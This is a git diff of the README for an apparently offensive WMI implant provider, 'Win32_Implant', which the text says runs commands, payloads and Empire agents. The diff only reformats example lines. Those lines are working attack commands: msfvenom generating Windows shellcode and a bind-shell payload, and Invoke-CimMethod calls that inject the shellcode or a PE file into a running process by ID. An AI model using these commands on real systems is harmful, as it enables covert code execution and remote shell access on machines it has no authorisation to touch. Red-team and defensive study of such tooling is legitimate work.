@@ -32,7 +32,7 @@ This WMI provider includes functions to execute commands, payloads, and Empire A
   
 * #### InjectShellCode
   * **Parameter:** ShellCodeString, ProcessId
-  * ##### Example: <br/>
+  * **Example:** <br/>
   msfvenom -p windows/x64/exec --format csharp CMD=calc.exe <br/>
   Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellCodeString=$payload; <br/>
@@ -71,8 +71,8 @@ This WMI provider includes functions to execute commands, payloads, and Empire A
 * #### InjectPeFile
   * **Parameters:** FileName, Parameters, ProcessId
   * **Example:** <br/>
-  * msfvenom -p windows/x64/shell_bind_tcp --format exe --arch x64 > /tmp/bind64.dll <br/>
-  * Invoke-CimMethod -ClassName Win32_Implant -Name InjectPe -Arguments @{
+  msfvenom -p windows/x64/shell_bind_tcp --format exe --arch x64 > /tmp/bind64.dll <br/>
+  Invoke-CimMethod -ClassName Win32_Implant -Name InjectPe -Arguments @{
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileName = "C:\bind64.exe"; <br/>
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parameters = ""; <br/>
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessId=5648; <br/>
